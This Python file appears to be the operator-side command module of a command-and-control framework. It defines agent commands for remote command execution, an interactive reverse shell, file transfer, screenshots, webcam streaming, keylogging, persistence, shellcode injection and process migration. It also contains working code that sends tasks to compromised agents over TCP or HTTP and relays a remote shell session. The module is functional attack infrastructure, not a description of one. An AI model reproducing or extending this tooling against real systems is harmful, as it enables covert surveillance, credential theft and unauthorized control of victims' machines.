from core.utils import common, config
from core.agents.utils import task as taskmng
from prettytable import PrettyTable, HRuleStyle
from core.transport import tcp, http

printer = common.Print_str()

AGENT_COMMANDS = {
    # === Session / Status ===
    "info": {
        "msg": "Show detailed system info of agent",
        "header": "SYSTEM INFO"
    },
    "tasks": {
        "msg": "Show all tasks of agent",
        "header": "TASKS"
    },
    "result": {
        "msg": "Show result of task ",
        "header": "TASKS"
    },
    # === Command Execution ===
    "cmd": {
        "msg": "Execute command on agent",
        "header": "CMD"
    },
    "shell": {
        "msg": "Stablish a shell on agent",
        "header": "SHELL"
    },
    "exec <file>": {
        "msg": "Execute uploaded binary",
        "header": "REMOTE EXECUTION"
    },

    # === File Operations ===
    "download <file>": {
        "msg": "Download file from agent",
        "header": "FILE DOWNLOAD"
    },
    "upload <file>": {
        "msg": "Upload file to agent",
        "header": "FILE UPLOAD"
    },
    # === Surveillance / Recon ===
    "screenshot": {
        "msg": "Take a screenshot of the desktop",
        "header": "SCREENSHOT"
    },
    "capture": {
        "msg": "Stream from webcam (if available)",
        "header": "WEBCAM CAPTURE"
    },
    "keylog": {
        "msg": "Start capturing keystrokes",
        "header": "KEYLOGGER"
    },
    "proc_list": {
        "msg": "List running processes",
        "header": "PROCESS LIST"
    },
    "proc_kill <pid>": {
        "msg": "Kill a process by PID",
        "header": "KILL PROCESS"
    },

    # === Lateral Movement / Persistence ===
    "persistence": {
        "msg": "Establish persistence on agent system",
        "header": "PERSISTENCE"
    },
    "inject <pid> <shellcode_file>": {
        "msg": "Inject shellcode into remote process",
        "header": "CODE INJECTION"
    },

    # === C2 / Agent Behavior ===
    "sleep <seconds>": {
        "msg": "Set agent sleep delay",
        "header": "SLEEP"
    },
    "migrate <pid>": {
        "msg": "Migrate to another process",
        "header": "PROCESS MIGRATION"
    },
    
    # === Misc ===
    "exit": {
        "msg": "Exit to previous menu ",
        "header": "HELP"
    },
    "help": {
        "msg": "Show this help message",
        "header": "HELP"
    }
}

def tasks(agent_id):
    table = PrettyTable()
    table.title = f"Agent {agent_id} tasks"
    table.field_names = ["ID","Command", "Status", "Created At"]
    table.align["Command"] = "l"  
    table.sortby = "ID"
    table.border = True
    table.header = True
    table.hrules = HRuleStyle.ALL
        
    tasks = taskmng.get_all_tasks(agent_id)
    for task in tasks:
        table.add_row([task.id, task.command, task.status, task.created_at])
    
    return str(table) + "\n"

def result(agent_id, arg=None):
    table = PrettyTable()
    table.border = True
    table.header = True
    table.hrules = HRuleStyle.ALL
    table.align["Command"] = "l"
    table.align["Result"] = "l"

    if arg:
        if arg == "all":
            table.title = f"All Results for Agent {agent_id}"
            table.field_names = ["ID", "Command", "Result"]
            tasks = taskmng.get_all_tasks(agent_id)
            if not tasks:
                return printer.warning(f"No tasks found for agent {agent_id}")
            for task in tasks:
                table.add_row([task.id, task.command, task.result])
        else:
            task = taskmng.get_task_by_id(agent_id, arg)
            if not task:
                return printer.warning(f"Task {arg} not found for agent {agent_id}")
            table.field_names = ["Command", "Result"]
            table.add_row([task.command, task.result])

    else:
        task = taskmng.get_earliest_result(agent_id)
        if not task:
            return printer.warning("No result has been sent yet")
        table.title = "Latest done task"
        table.field_names = ["ID", "Command", "Result"]
        table.add_row([task.id, task.command, task.result])

    return str(table) + "\n"


def tasks(agent_id):
    table = PrettyTable()
    table.title = f"Agent {agent_id} tasks"
    table.field_names = ["ID","Command", "Status", "Created At"]
    table.align["Command"] = "l"  
    table.sortby = "ID"
    table.border = True
    table.header = True
    table.hrules = HRuleStyle.ALL
        
    tasks = taskmng.get_all_tasks(agent_id)
    for task in tasks:
        table.add_row([task.id, task.command, task.status, task.created_at])
        
    
    return str(table) + "\n"

def cmd(agent, cmd, conn_type):
    header = AGENT_COMMANDS.get("cmd")["header"]
    if conn_type == "tcp":
        tcp.send_data(agent.conn, cmd, header)
        _, response = tcp.recv_data(agent.conn)
    elif conn_type == "http":
        task_id = taskmng.add_task(agent.id, cmd)
        response = printer.success(f"Task {task_id} added")
    return response

def shell(conn, agent):
    
    header = AGENT_COMMANDS.get("shell")["header"]
    tcp.send_data(conn, f"{printer.task("Stablishing shell...")}{printer.success("Shell stablished")}", header)
    tcp.send_data(conn, "SHELL", header)
    tcp.send_data(agent.conn, " ", header)
    
    while True:
        _, cmd = tcp.recv_data(conn)
        if cmd == "exit":
            tcp.send_data(agent.conn, cmd)
            _, response = tcp.recv_data(agent.conn)
            break
        tcp.send_data(agent.conn, cmd)
        _, response = tcp.recv_data(agent.conn)
        tcp.send_data(conn, response)
        
    return f"{printer.task("Closing shell...")}{printer.success(response)}"

def exit():
    return printer.signal("Main Menu")

# Helps

def help():
    help_lines = ["Available Commands:\n"]

    for cmd, info in AGENT_COMMANDS.items():
        msg = info["msg"] if isinstance(info, dict) else info
        help_lines.append(f"  - {cmd:<20} {msg}")
        
    return printer.info("\n".join(help_lines))


def cmd_help():
    return printer.info("Usage: cmd <command>")

def listener_help():
    return printer.info("Usage: listener <type:ip:port> <name>")

def interact_help():
    return printer.info("Usage: interact <id>")